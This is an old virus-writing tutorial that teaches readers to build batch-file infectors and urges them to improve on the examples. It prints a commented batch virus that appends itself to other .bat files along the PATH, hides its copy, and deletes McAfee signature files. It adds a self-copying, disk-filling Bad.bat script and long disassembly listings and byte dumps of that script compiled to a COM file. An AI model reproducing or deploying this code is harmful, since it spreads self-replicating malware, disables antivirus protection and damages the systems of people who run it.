   
         ;====================================;
         ;   Easy way to make Batch Infector  ;
         ;====================================;

Batch file are easy to make or not, But you must try first trial and error.
Basicly play with batch file are more fun. Like you play with some toys. 
I will show it to you how to make fun with batch but before that, i will say
to you english is not my first language, now prepare some tools to begin.

Credit to: Knowdeth, Stormbringer [Phalcon/Skism].

There are: - Some editor like Notepad or Edit in DOS.
           - Disassembly tools like IDA3.8 or Sourcer7 or etc.
           - Bat2Com or Bat2Exec utility (Must have!!!).
           - Little about DOS command.

This is just play and fun. make much more batch file to assembly structure. 
This more fun, make it your self, and write what you want.
Batch is "Autoexec.bat" in MS-DOS. And you can add some ANSI BOMB, etc 
In this tutorial virii with example command. If need some batch file code 
i think Timo Salmi Batch Guide are good for YoU.

Let's Begin With Trial and Error
--------------------------------

The original code in below...... write in MS-DOS editor. Or just Cut 
line in below. I use this code from SABV=The Super Appending Batch VCK
ver 1.1k by Knowdeth. Example of some batch virii, but you can't make it
into COM virii, know why??   :((
Cuz all command line in below are Batch file structure, still don't belive
try your self and see what happen with that after you execute it

------------------ Cut In Here ---------------------------------------
:: [Sat4n]         - THis Virii name
:: by Assembler Head  - who made this virii
:: Generated with The Super Appending Batch VCK by -what it was made with
:: -KD- / Metaphase & NoMercy   -  It's Knowdeth ;-)) 
:: DO NOT MODIFY ABOVE THIS LINE! - dont touch cause he want his credit hehe
@echo off%_AH%    -turns off echoing
if '%1=='AH goto AH%2   -branches if 1st parm 
set AH=%0.bat           -set the variables in %0.bat
if not exist %AH% set AH=%0  -branches if file is there
if '%AH%==' set AH=autoexec.bat  -branches if 1st parm then sets the autoexec
if exist c:\_AH.bat goto AH_go  -if c:\_AH.bat exist goto AH_go sub
if not exist %AH% goto evol_AH  -if AH dont exits then goto evol_AH sub
find "AH"<%AH%>c:\_AH.bat     -strip code from host
attrib c:\_AH.bat +h         -hide _AH.bat
:AH_go                      -AH_go sub
if '%!AH%=='----- goto AH_exit  -if tally = 5 runs then goto AH_exit
set !AH=%!AH%-        -set the variables
command /e:5000 /c c:\_AH AH v . .. \ %path%  -do the command
:evol_AH    -evol_AH sub
set AH=     -variables
goto AH_pay   -goto AH_paysub
:AHv          -AHv sub
shift%_AH%    -use key in an undefined variable
if '%2==' exit AH  -check then exit
for %%a in (%2\*.bat %2*.bat) do call c:\_AH AH inf %%a  -look for batchs
goto AHv    -goto AHv sub
:AH_inf     -AH_inf sub
find "AH"<%3>nul   -check if virus present in target
if not errorlevel 1 goto AH_jump  -branch if there, get next filename
type %3>AH$     -sends output to a file
echo.>>AH$      -appends output to the file
type c:\_AH.bat>>AH$   -runs _AH.bat
move AH$ %3>nul      -output into nothingness
set AH!=%AH!%-     -set the variables
if %AH#%==-----exit  if AH = 5 infects then exit
:AH_jump       -satan_jump sub
set AH!=%AH!%-    -set the variables
if %AH!%==-----exit   -if AH = 5 seeks then exit
:AH_pay        -AH_pay sub 


echo More Popular than Die   -print this at a dos prompt
echo y| del c:\mcafee\*.dat  -kill the file
echo y| del c:\progra~1\mcafee\*.dat  -kill the file in Win9x
:AH_exit   -exit its all over

--------------- End Of File ----------------------------

And here is simple code with batch file(or you can write your self), 
be creative!!! ;-))))). Cuz i know you can make better then mine. Code 
in below just for test. 

-------------------Cut Here---------------------------

@echo off         - turn off echo
echo Your need this!!!  -print text in screen
echo Die Now sucker............................................ -same with above

echo :hell > Bad.bat  - print hell into bad.bat with append     
echo copy bad.bat bad1.bat >> Bad.bat - same
echo copy bad.bat+bad1.bat bad2.bat >> Bad.bat
echo goto hell >> Bad.bat - this is make file become larger
cd\                       - change directory
goto next                 - go to next
:next
echo :hell > Bad.bat
echo copy bad.bat bad1.bat >> Bad.bat
echo copy bad.bat+bad1.bat bad2.bat >> Bad.bat
echo goto hell >> Bad.bat
echo ------- EnD Of FilE -------------

------------------------ eof -------------------------

And here is same with above but in assembly code. I make it with Bat2Com
or Bat2Exec utility for make into *.com file after that i disassembly with 
sourcer7 and IDA3.8. You can rename it from *.bat to *.com, cuz it just 
error.

-------------------- Cut Here ------------------------

	PSP_envirn_seg	equ	2Ch			; (3684:002C=0)

	seg_a		segment	byte public
			assume	cs:seg_a, ds:seg_a
			org	100h     ;we make *.com file
	beta1		proc	far
	start:
		cld		   ; clear direction file
		mov	bp,offset data_1	; move data_1 to bp
		mov	bp,[bp]
		mov	sp,[bp+2]
		mov	bx,[bp+4]
		mov	ah,4Ah        ;RTC Alarm Handler Vector
		int	21h		  ;DOS function Dispatcher
		mov	ax,ds:PSP_envirn_seg  ;move ds to ax
		mov	[bp+1Ah],ax
		mov	bx,[bp+0]
		jmp	bx		
data_1		db	83h		
		db	2
loc_1:					
		mov	dl,[si]
		inc	si
		or	dl,dl			
		jz	loc_ret_2		
		mov	ah,2          ;
		int	21h			
				
		jmp	short loc_1    ; code can jump too, hehe

loc_ret_2:					
		retn             ;Return from procedure
			                  
		mov	word ptr [bp+10h],0FFFFh

		mov	dx,si
		xor	cx,cx			;zero cx
		mov	ax,3C02h          ;
		or	di,di			
		jz	loc_3			
		inc	ah
loc_3:					
		int	21h			
						
		jc	loc_ret_5		
		mov	bx,ax
		or	di,di			
		jz	loc_4			
		mov	ax,4202h     ;go to end of file
		xor	dx,dx		 ;zero dx	
		mov	cx,dx        ;move dx to cx
		int	21h	       ;DOS funtion		 
		jc	loc_ret_5		
loc_4:					
		mov	[bp+12h],bx
		push	bx
		mov	ah,45h	;Duplicate file handle	
		mov	bx,1        ;move 1 to bx
		int	21h		;DOS!	
					
		mov	[bp+10h],ax
		mov	cx,1
		pop	bx
		mov	ah,46h       ;Force duplicate file handle
		int	21h		 ;Do it
					

loc_ret_5:				
		retn               ;return from procedure
		                  
		cmp	word ptr [bp+10h],0FFFFh
		je	loc_ret_6	
		mov	ah,46h	
		mov	bx,[bp+10h]
		mov	cx,1
		int	21h		
					
		mov	ah,3Eh	 ;close file after infect.
		mov	bx,[bp+12h]
		int	21h		
					

loc_ret_6:				
		retn
			            
		lodsw				
		add	[bx],sp
		add	dl,[bp+di-18h]
		add	[bx+si],al
		pop	bx


		mov	di,si
		dec	di
		push	ds
		mov	al,[bp+1Eh]
		push	ax
		call	word ptr [bx-6]	
		call	word ptr cs:[bx-8]
		pop	ax
		mov	[bp+1Eh],al
		pop	ds
		pop	bx
		retn
		db	 53h,0E8h, 20h, 00h, 00h
		db	'DUMMY   FCB'
		db	0, 0, 0, 0, 0
		db	'DUMMY   FCB'
		db	0, 0, 0, 0

beta1		endp

;+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
;                              SUBROUTINE
;+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=

sub_1		proc	near
		pop	bx          ;show bx
		push	ds          ;save ds into stack
		push	es          ;save es into stack
		mov	[bp+2],sp
		push	di          ;save di ----"-----
		push	si          ;save si ----"-----
		mov	si,di       ;move di to si
		inc	si          ;add 1 to si
		lea	di,[bx]		
		mov	ax,2903h    ;parse a filename for FCB. 
                              ;modify file extention if specified
		int	21h		;DOS!	

		lea	di,[bx+10h]		
		mov	ax,2903h
		int	21h			
					
					
		pop	si         ;restore si again
		pop	di         ;restore di again
      	push	cs         ;save cs to stack
		lea	dx,[bx+10h]	
		push	dx         ;save dx to stack
		push	cs         ;save cs to stack
		lea	dx,[bx]	
		push	dx
      	push	cs
		push	di
      	mov	ax,cs:PSP_envirn_seg	
		push	ax
		mov	bx,sp
		mov	ax,4B00h

		mov	dx,si
		int	21h			
		mov	bp,offset data_1	
		mov	bp,cs:[bp]
		mov	bx,cs
		cli			;Clear interrupt flag
		mov	ss,bx
		mov	sp,[bp+2]
		sti			;Set/ enable interrupt flag again	
		cld			;Clear direction file	
		pop	es
		pop	ds
		mov	ah,4Dh      ;Get return code of sub-process
		int	21h		;DOS again, hehe	 
						
		mov	[bp+1Eh],al
		pop	bx
		retn
sub_1		endp

		                        
		cmp	ax,5302h     ;compare ax with 5302h
		call	sub_2		 ;call sub_2	
		inc	bx           ;add 1 into bx
		dec	di           ;dec di or -1 di
		dec	bp
		push	bx
		push	ax
		inc	bp
		inc	bx

;+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
;                              SUBROUTINE
;
;         Called from:   3684:0228
;$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=$=
sub_2		proc	near
		pop	bx
		mov	dx,7
		mov	si,bx
		call	word ptr [bx-6]	
		pop	bx
		retn
sub_2		endp

			                  
		push	bx
		push	cx
		push	di
		push	es
		mov	es,[bp+1Ah]
		xor	di,di			
		mov	bx,si
loc_7:					
		mov	si,bx

		mov	cx,dx
		repe	cmpsb			
		jz	loc_9			
		xor	al,al			
		mov	cx,0FFFFh
		repne	scasb			
		cmp	byte ptr es:[di],0
		jne	loc_7			
loc_8:					
		mov	si,di
		push	es
		pop	ds
		stc				
		jmp	short loc_13	
loc_9:					
		mov	si,di
		push	es
		pop	ds
loc_10:					
		lodsb				
		cmp	al,3Dh		
		jne	loc_10		
		cmp	byte ptr [si],0
		je	loc_8			
loc_11:					
		lodsb				
		or	al,al			
		jc	loc_12		
		cmp	al,20h		
		jb	loc_11		
loc_12:					
		dec	si
		clc				
loc_13:					
		pop	es
		pop	di
		pop	cx
		pop	bx
		retn
			                  
		pop	dx
		add	al,58h		
		pop	es
		mov	dh,0
		pop	dx
		pop	es
		pop	bx
		or	[si+9],bl
		pop	bp
		or	bl,[bx+si]
		add	[bp+di],bh
		push	ss
		or	ax,0F804h
		jnz	loc_14		
		pushf				
		adc	al,[bx+di]
		cli				

		popf				
loc_14:					
		jmp	short $+3
		db	0, 0
		db	'Your need this!!!', 0Ah, 0Dh, 0
		db	'Die Now sucker..................'
		db	'..........................', 0Ah
		db	0Dh, 0
		db	'Bad.bat', 0
		db	':hell          ', 0Ah, 0Dh, 0
		db	'Bad.bat', 0
		db	'copy bad.bat bad1.bat           '
		db	0Ah, 0Dh, 0
		db	'Bad.bat', 0
		db	'copy bad.bat+bad1.bat bad2.bat  '
		db	'         ', 0Ah, 0Dh, 0
		db	'Bad.bat', 0
		db	'goto hell           ', 0Ah, 0Dh, 0
		db	 06h, 2Fh, 43h, 20h, 43h, 44h
		db	 5Ch, 0Dh, 00h,0FFh,0FFh,0E3h
		db	 04h, 04h
		db	'NEXTBad.bat', 0
		db	':hell          ', 0Ah, 0Dh, 0
		db	'Bad.bat', 0
		db	'copy bad.bat bad1.bat           '
		db	0Ah, 0Dh, 0
		db	'Bad.bat', 0
		db	'copy bad.bat+bad1.bat bad2.bat  '
		db	'         ', 0Ah, 0Dh, 0
		db	'Bad.bat', 0
		db	'goto hell           ', 0Ah, 0Dh, 0
		db	'------- EnD Of FilE ------------'
		db	'-', 0Ah, 0Dh, 0
		db	 8Dh,0B6h, 20h, 00h,0B8h, 22h
		db	 01h,0FFh,0D0h, 8Dh,0B6h, 34h
		db	 00h,0B8h, 22h, 01h,0FFh,0D0h
		db	 8Dh,0B6h, 71h, 00h,0BFh, 00h
		db	 00h,0B8h, 30h, 01h,0FFh,0D0h
		db	 8Dh,0B6h, 79h, 00h,0B8h, 22h
		db	 01h,0FFh,0D0h,0B8h, 71h, 01h
		db	0FFh,0D0h, 8Dh,0B6h, 8Bh, 00h
		db	0BFh, 01h, 00h,0B8h, 30h, 01h
		db	0FFh,0D0h, 8Dh,0B6h, 93h, 00h
		db	0B8h, 22h, 01h,0FFh,0D0h,0B8h
		db	 71h, 01h,0FFh,0D0h, 8Dh,0B6h
		db	0B6h, 00h,0BFh, 01h, 00h,0B8h
		db	 30h, 01h,0FFh,0D0h, 8Dh,0B6h
		db	0BEh, 00h,0B8h, 22h, 01h,0FFh
		db	0D0h,0B8h, 71h, 01h,0FFh,0D0h
		db	 8Dh,0B6h,0EAh, 00h,0BFh, 01h
		db	 00h,0B8h, 30h, 01h,0FFh,0D0h
		db	 8Dh,0B6h,0F2h, 00h,0B8h, 22h
		db	 01h,0FFh,0D0h,0B8h, 71h, 01h
		db	0FFh,0D0h, 8Dh,0B6h, 0Ah, 01h
		db	0B8h, 90h, 01h,0FFh,0D0h, 8Bh
		db	 86h, 14h, 01h,0FFh,0E0h, 8Dh
		db	0B6h, 1Bh, 01h,0BFh, 00h, 00h

		db	0B8h, 30h, 01h,0FFh,0D0h, 8Dh
		db	0B6h, 23h, 01h,0B8h, 22h, 01h
		db	0FFh,0D0h,0B8h, 71h, 01h,0FFh
		db	0D0h, 8Dh,0B6h, 35h, 01h,0BFh
		db	 01h, 00h,0B8h, 30h, 01h,0FFh
		db	0D0h, 8Dh,0B6h, 3Dh, 01h,0B8h
		db	 22h, 01h,0FFh,0D0h,0B8h, 71h
		db	 01h,0FFh,0D0h, 8Dh,0B6h, 60h
		db	 01h,0BFh, 01h, 00h,0B8h, 30h
		db	 01h,0FFh,0D0h, 8Dh,0B6h, 68h
		db	 01h,0B8h, 22h, 01h,0FFh,0D0h
		db	0B8h, 71h, 01h,0FFh,0D0h, 8Dh
		db	0B6h, 94h, 01h,0BFh, 01h, 00h
		db	0B8h, 30h, 01h,0FFh,0D0h, 8Dh
		db	0B6h, 9Ch, 01h,0B8h, 22h, 01h
		db	0FFh,0D0h,0B8h, 71h, 01h,0FFh
		db	0D0h, 8Dh,0B6h,0B3h, 01h,0B8h
		db	 22h, 01h,0FFh,0D0h,0B8h, 00h
		db	 4Ch,0CDh
		db	21h

seg_a		ends

      	end	start
---------------------- Cut Here ------------------------------
Please also take a look some code below, I disassembly it with ida3.8
learn it with disassembly is good for you. If you still confuse with that
read more assembly book to understand some basic code. And sorry my poor
knowledge cuz i don't include useful text and comment in beside code. For
that you can look in some assembly book for basic command.

; Segment type:	Pure code
seg000		segment	byte public 'CODE'
		assume cs:seg000
		org 100h
		assume es:nothing, ss:nothing, ds:seg000

; $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

;	<<	S u b r o u t i n e   >>

		public start
start		proc near
		cld	
		mov	bp, 120h
		mov	bp, [bp+0]
		mov	sp, [bp+2]
		mov	bx, [bp+4]
		mov	ah, 4Ah
		int	21h		
		mov	ax, ds:2Ch
		mov	[bp+1Ah], ax
		mov	bx, [bp+0]
		jmp	bx
start		endp

; +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
		db  83h	; �
		db    2	;  
		db  8Ah	; �
		db  14h	;  
		db  46h	; F
		db  0Ah	;  
		db 0D2h	; -
		db  74h	; t
		db    6	;  
		db 0B4h	; �
		db    2	;  
		db 0CDh	; -
		db  21h	; !
		db 0EBh	; d
		db 0F3h	; =
		db 0C3h	; +
		db 0C7h	; �
		db  86h	; �
		db  10h	;  
		db    0	;  
		db 0FFh	;  
		db 0FFh	;  
		db  8Bh	; �
		db 0D6h	; +
		db  33h	; 3
		db 0C9h	; +
		db 0B8h	; +
		db    2	;  
		db  3Ch	; <
		db  0Bh	;  
		db 0FFh	;  
		db  74h	; t
		db    2	;  
		db 0FEh	; �
		db 0C4h	; -
		db 0CDh	; -
		db  21h	; !
		db  72h	; r
		db  29h	; )
		db  8Bh	; �
		db 0D8h	; +
		db  0Bh	;  
		db 0FFh	;  
		db  74h	; t
		db  0Bh	;  
		db 0B8h	; +
		db    2	;  
		db  42h	; B
		db  33h	; 3
		db 0D2h	; -
		db  8Bh	; �
		db 0CAh	; -
		db 0CDh	; -
		db  21h	; !
		db  72h	; r
		db  18h	;  
		db  89h	; �
		db  9Eh	; P
		db  12h	;  
		db    0	;  
		db  53h	; S
		db 0B4h	; �
		db  45h	; E
		db 0BBh	; +
		db    1	;  
		db    0	;  
		db 0CDh	; -
		db  21h	; !
		db  89h	; �
		db  86h	; �
		db  10h	;  
		db    0	;  
		db 0B9h	; �
		db    1	;  
		db    0	;  
		db  5Bh	; [
		db 0B4h	; �
		db  46h	; F
		db 0CDh	; -
		db  21h	; !
		db 0C3h	; +
		db  83h	; �
		db 0BEh	; +
		db  10h	;  
		db    0	;  
		db 0FFh	;  
		db  74h	; t
		db  13h	;  
		db 0B4h	; �
		db  46h	; F
		db  8Bh	; �
		db  9Eh	; P
		db  10h	;  
		db    0	;  
		db 0B9h	; �
		db    1	;  
		db    0	;  
		db 0CDh	; -
		db  21h	; !
		db 0B4h	; �
		db  3Eh	; >
		db  8Bh	; �
		db  9Eh	; P
		db  12h	;  
		db    0	;  
		db 0CDh	; -
		db  21h	; !
		db 0C3h	; +
		db 0ADh	; �
		db    1	;  
		db  27h	; '
		db    2	;  
		db  53h	; S
		db 0E8h	; F
		db    0	;  
		db    0	;  
		db  5Bh	; [
		db  8Bh	; �
		db 0FEh	; �
		db  4Fh	; O
		db  1Eh	;  
		db  8Ah	; �
		db  86h	; �
		db  1Eh	;  
		db    0	;  
		db  50h	; P
		db 0FFh	;  
		db  57h	; W
		db 0FAh	; �
		db  2Eh	; .
		db 0FFh	;  
		db  57h	; W
		db 0F8h	; �
		db  58h	; X
		db  88h	; �
		db  86h	; �
		db  1Eh	;  
		db    0	;  
		db  1Fh	;  
		db  5Bh	; [
		db 0C3h	; +
		db  53h	; S
		db 0E8h	; F
		db  20h	;  
		db    0	;  
		db    0	;  
		db  44h	; D
		db  55h	; U
		db  4Dh	; M
		db  4Dh	; M
		db  59h	; Y
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  46h	; F
		db  43h	; C
		db  42h	; B
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  44h	; D
		db  55h	; U
		db  4Dh	; M
		db  4Dh	; M
		db  59h	; Y
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  46h	; F
		db  43h	; C
		db  42h	; B
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  5Bh	; [
		db  1Eh	;  
		db    6	;  
		db  89h	; �
		db 0A6h	; �
		db    2	;  
		db    0	;  
		db  57h	; W
		db  56h	; V
		db  8Bh	; �
		db 0F7h	; ~
		db  46h	; F
		db  8Dh	; �
		db  3Fh	; ?
		db 0B8h	; +
		db    3	;  
		db  29h	; )
		db 0CDh	; -
		db  21h	; !
		db  8Dh	; �
		db  7Fh	; 
		db  10h	;  
		db 0B8h	; +
		db    3	;  
		db  29h	; )
		db 0CDh	; -
		db  21h	; !
		db  5Eh	; ^
		db  5Fh	; _
		db  0Eh	;  
		db  8Dh	; �
		db  57h	; W
		db  10h	;  
		db  52h	; R
		db  0Eh	;  
		db  8Dh	; �
		db  17h	;  
		db  52h	; R
		db  0Eh	;  
		db  57h	; W
		db  2Eh	; .
		db 0A1h	; �
		db  2Ch	; ,
		db    0	;  
		db  50h	; P
		db  8Bh	; �
		db 0DCh	; _
		db 0B8h	; +
		db    0	;  
		db  4Bh	; K
		db  8Bh	; �
		db 0D6h	; +
		db 0CDh	; -
		db  21h	; !
		db 0BDh	; +
		db  20h	;  
		db    1	;  
		db  2Eh	; .
		db  8Bh	; �
		db  6Eh	; n
		db    0	;  
		db  8Ch	; �
		db 0CBh	; -
		db 0FAh	; �
		db  8Eh	; �
		db 0D3h	; +
		db  8Bh	; �
		db 0A6h	; �
		db    2	;  
		db    0	;  
		db 0FBh	; v
		db 0FCh	; n
		db    7	;  
		db  1Fh	;  
		db 0B4h	; �
		db  4Dh	; M
		db 0CDh	; -
		db  21h	; !
		db  88h	; �
		db  86h	; �
		db  1Eh	;  
		db    0	;  
		db  5Bh	; [
		db 0C3h	; +
		db  3Dh	; =
		db    2	;  
		db  53h	; S
		db 0E8h	; F
		db    7	;  
		db    0	;  
		db  43h	; C
		db  4Fh	; O
		db  4Dh	; M
		db  53h	; S
		db  50h	; P
		db  45h	; E
		db  43h	; C
		db  5Bh	; [
		db 0BAh	; �
		db    7	;  
		db    0	;  
		db  8Bh	; �
		db 0F3h	; =
		db 0FFh	;  
		db  57h	; W
		db 0FAh	; �
		db  5Bh	; [
		db 0C3h	; +
		db  53h	; S
		db  51h	; Q
		db  57h	; W
		db    6	;  
		db  8Eh	; �
		db  86h	; �
		db  1Ah	;  
		db    0	;  
		db  33h	; 3
		db 0FFh	;  
		db  8Bh	; �
		db 0DEh	; �
		db  8Bh	; �
		db 0F3h	; =
		db  8Bh	; �
		db 0CAh	; -
		db 0F3h	; =
		db 0A6h	; �
		db  74h	; t
		db  14h	;  
		db  32h	; 2
		db 0C0h	; +
		db 0B9h	; �
		db 0FFh	;  
		db 0FFh	;  
		db 0F2h	; =
		db 0AEh	; �
		db  26h	; &
		db  80h	; �
		db  3Dh	; =
		db    0	;  
		db  75h	; u
		db 0EBh	; d
		db  8Bh	; �
		db 0F7h	; ~
		db    6	;  
		db  1Fh	;  
		db 0F9h	; �
		db 0EBh	; d
		db  19h	;  
		db  8Bh	; �
		db 0F7h	; ~
		db    6	;  
		db  1Fh	;  
		db 0ACh	; �
		db  3Ch	; <
		db  3Dh	; =
		db  75h	; u
		db 0FBh	; v
		db  80h	; �
		db  3Ch	; <
		db    0	;  
		db  74h	; t
		db 0EBh	; d
		db 0ACh	; �
		db  0Ah	;  
		db 0C0h	; +
		db  72h	; r
		db    4	;  
		db  3Ch	; <
		db  20h	;  
		db  72h	; r
		db 0F7h	; ~
		db  4Eh	; N
		db 0F8h	; �
		db    7	;  
		db  5Fh	; _
		db  59h	; Y
		db  5Bh	; [
		db 0C3h	; +
		db  5Ah	; Z
		db    4	;  
		db  58h	; X
		db    7	;  
		db 0B6h	; �
		db    0	;  
		db  5Ah	; Z
		db    7	;  
		db  5Bh	; [
		db    8	;  
		db  5Ch	; \
		db    9	;  
		db  5Dh	; ]
		db  0Ah	;  
		db  18h	;  
		db    0	;  
		db  3Bh	; ;
		db  16h	;  
		db  0Dh	;  
		db    4	;  
		db 0F8h	; �
		db  75h	; u
		db    5	;  
		db  9Ch	; �
		db  12h	;  
		db    1	;  
		db 0FAh	; �
		db  9Dh	; �
		db 0EBh	; d
		db    1	;  
		db    0	;  
		db    0	;  
		db  59h	; Y
		db  6Fh	; o
		db  75h	; u
		db  72h	; r
		db  20h	;  
		db  6Eh	; n
		db  65h	; e
		db  65h	; e
		db  64h	; d
		db  20h	;  
		db  74h	; t
		db  68h	; h
		db  69h	; i
		db  73h	; s
		db  21h	; !
		db  21h	; !
		db  21h	; !
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db  44h	; D
		db  69h	; i
		db  65h	; e
		db  20h	;  
		db  4Eh	; N
		db  6Fh	; o
		db  77h	; w
		db  20h	;  
		db  73h	; s
		db  75h	; u
		db  63h	; c
		db  6Bh	; k
		db  65h	; e
		db  72h	; r
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  2Eh	; .
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db  42h	; B
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db    0	;  
		db  3Ah	; :
		db  68h	; h
		db  65h	; e
		db  6Ch	; l
		db  6Ch	; l
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db  42h	; B
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db    0	;  
		db  63h	; c
		db  6Fh	; o
		db  70h	; p
		db  79h	; y
		db  20h	;  
		db  62h	; b
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db  20h	;  
		db  62h	; b
		db  61h	; a
		db  64h	; d
		db  31h	; 1
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db  42h	; B
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db    0	;  
		db  63h	; c
		db  6Fh	; o
		db  70h	; p
		db  79h	; y
		db  20h	;  
		db  62h	; b
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db  2Bh	; +
		db  62h	; b
		db  61h	; a
		db  64h	; d
		db  31h	; 1
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db  20h	;  
		db  62h	; b
		db  61h	; a
		db  64h	; d
		db  32h	; 2
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db  42h	; B
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db    0	;  
		db  67h	; g
		db  6Fh	; o
		db  74h	; t
		db  6Fh	; o
		db  20h	;  
		db  68h	; h
		db  65h	; e
		db  6Ch	; l
		db  6Ch	; l
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db    6	;  
		db  2Fh	; /
		db  43h	; C
		db  20h	;  
		db  43h	; C
		db  44h	; D
		db  5Ch	; \
		db  0Dh	;  
		db    0	;  
		db 0FFh	;  
		db 0FFh	;  
		db 0E3h	; p
		db    4	;  
		db    4	;  
		db  4Eh	; N
		db  45h	; E
		db  58h	; X
		db  54h	; T
		db  42h	; B
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db    0	;  
		db  3Ah	; :
		db  68h	; h
		db  65h	; e
		db  6Ch	; l
		db  6Ch	; l
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db  42h	; B
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db    0	;  
		db  63h	; c
		db  6Fh	; o
		db  70h	; p
		db  79h	; y
		db  20h	;  
		db  62h	; b
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db  20h	;  
		db  62h	; b
		db  61h	; a
		db  64h	; d
		db  31h	; 1
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db  42h	; B
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db    0	;  
		db  63h	; c
		db  6Fh	; o
		db  70h	; p
		db  79h	; y
		db  20h	;  
		db  62h	; b
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db  2Bh	; +
		db  62h	; b
		db  61h	; a
		db  64h	; d
		db  31h	; 1
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db  20h	;  
		db  62h	; b
		db  61h	; a
		db  64h	; d
		db  32h	; 2
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  0Ah	;  
		db  0Dh	;  
		db    0	;  
		db  42h	; B
		db  61h	; a
		db  64h	; d
		db  2Eh	; .
		db  62h	; b
		db  61h	; a
		db  74h	; t
		db    0	;  
		db  67h	; g
		db  6Fh	; o
		db  74h	; t
		db  6Fh	; o
		db  20h	;  
		db  68h	; h
		db  65h	; e
		db  6Ch	; l
		db  6Ch	; l
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
		db  20h	;  
